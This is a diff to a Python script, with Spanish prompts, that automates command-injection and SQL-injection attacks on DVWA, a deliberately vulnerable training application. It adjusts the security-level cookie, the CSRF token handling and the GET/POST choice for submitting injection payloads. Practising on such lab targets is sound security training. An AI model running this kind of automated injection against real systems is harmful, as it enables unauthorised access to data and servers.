@@ -45,6 +45,9 @@ def security_level(user_token: str):
         "seclev_submit": "Submit",
         "user_token": user_token
     })
+    for cookie in SESSION.cookies:
+        if cookie.name == "security":
+            cookie.value = DVWA_SECURITY_LEVELS[level]
     return level
 
 
@@ -64,7 +67,6 @@ def command_injection(security_level, user_token: str):
     response = SESSION.post(DVWA_URL + "/vulnerabilities/exec/", data={
         "ip": command,
         "Submit": "Submit",
-        "user_token": user_token
     })
     soup = BeautifulSoup(response.text, "html.parser")
     return soup.find("pre").text.strip()
@@ -83,17 +85,24 @@ def sql_injection(security_level):
         f"Inyección SQL (default {DVWA_SECURITY_LEVELS[security_level]}: {recommendations[security_level]}): ")
     sqli = recommendations[security_level] if not sqli else sqli
     print(f"Ejecutando SQLi: {recommendations[security_level]}")
+    uri = "/vulnerabilities/sqli/"
     if security_level == 3:
-        SESSION.post(DVWA_URL + "/vulnerabilities/sqli/session-input.php", data={
+        SESSION.post(DVWA_URL + f"{uri}session-input.php", data={
             "id": sqli,
             "Submit": "Submit"
         })
-        response = SESSION.get(DVWA_URL + "/vulnerabilities/sqli")
+        response = SESSION.get(DVWA_URL + uri)
+    elif security_level == 2:
+        response = SESSION.post(DVWA_URL + uri, data={
+            "id": sqli,
+            "Submit": "Submit"
+        })
     else:
-        response = SESSION.post(DVWA_URL + "/vulnerabilities/sqli/", data={
+        response = SESSION.get(DVWA_URL + uri, params={
             "id": sqli,
             "Submit": "Submit"
-        })
+            })
+
     soup = BeautifulSoup(response.text, "html.parser")
     pres = soup.find_all("pre")
     return [pre.text.strip() for pre in pres]
